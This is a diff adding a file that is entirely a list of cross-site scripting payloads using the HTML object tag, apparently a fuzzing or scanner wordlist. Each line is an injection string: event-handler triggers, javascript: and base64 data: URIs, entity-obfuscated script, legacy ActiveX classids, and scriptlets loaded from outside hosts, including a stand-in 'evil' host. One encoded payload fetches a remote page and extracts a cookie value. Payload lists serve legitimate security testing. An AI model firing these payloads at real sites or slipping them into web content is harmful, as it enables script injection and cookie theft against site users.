@@ -1,0 +1,69 @@
+<object data=/ onload=alert(1)>
+<object data="javascript:alert(1)">
+<object data=/ onreadystatechange=alert(1)>
+<object data=javascript:alert(1)>
+<object data="//evil?
+<object onafterscriptexecute=confirm(0)>
+<object onbeforescriptexecute=confirm(0)>
+<object draggable="true" ondrag="alert(1)">test</object>
+<object draggable="true" ondragend="alert(1)">test</object>
+<object draggable="true" ondragenter="alert(1)">test</object>
+<object draggable="true" ondragleave="alert(1)">test</object>
+<object draggable="true" ondragstart="alert(1)">test</object>
+<object id=x onfocus=alert(1) type=text/html>
+<object id=x onfocusin=alert(1) type=text/html>
+<object id=x tabindex=1 onactivate=alert(1)></object>
+<object id=x tabindex=1 onbeforeactivate=alert(1)></object>
+<object id=x tabindex=1 onbeforedeactivate=alert(1)></object><input autofocus>
+<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>
+<object onafterscriptexecute=alert(1)><script>1</script>
+<object onbeforecopy="alert(1)" contenteditable>test</object>
+<object onbeforecut="alert(1)" contenteditable>test</object>
+<object onbeforepaste="alert(1)" contenteditable>test</object>
+<object onbeforescriptexecute=alert(1)><script>1</script>
+<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>
+<object onclick="alert(1)">test</object>
+<object oncontextmenu="alert(1)">test</object>
+<object oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<object oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<object ondblclick="alert(1)" autofocus tabindex=1>test</object>
+<object onerror=alert(1) data=1 type=image/gif>
+<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>
+<object onkeydown="alert(1)" contenteditable>test</object>
+<object onkeypress="alert(1)" contenteditable>test</object>
+<object onkeyup="alert(1)" contenteditable>test</object>
+<object onmousedown="alert(1)">test</object>
+<object onmouseenter="alert(1)">test</object>
+<object onmouseleave="alert(1)">test</object>
+<object onmousemove="alert(1)">test</object>
+<object onmouseout="alert(1)">test</object>
+<object onmouseover="alert(1)">test</object>
+<object onmouseup="alert(1)">test</object>
+<object onmousewheel=alert(1)>requires scrolling
+<object onpaste="alert(1)" contenteditable>test</object>
+<object onpointerdown=alert(1)>XSS</object>
+<object onpointerenter=alert(1)>XSS</object>
+<object onpointerleave=alert(1)>XSS</object>
+<object onpointermove=alert(1)>XSS</object>
+<object onpointerout=alert(1)>XSS</object>
+<object onpointerover=alert(1)>XSS</object>
+<object onpointerrawupdate=alert(1)>XSS</object>
+<object onpointerup=alert(1)>XSS</object>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<object onError object onError="javascript:javascript:alert(1)"></object onError>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
+<object data="data:text/html;base64,%(base64)s">
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
+<object onerror=javascript:javascript:alert(1)>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
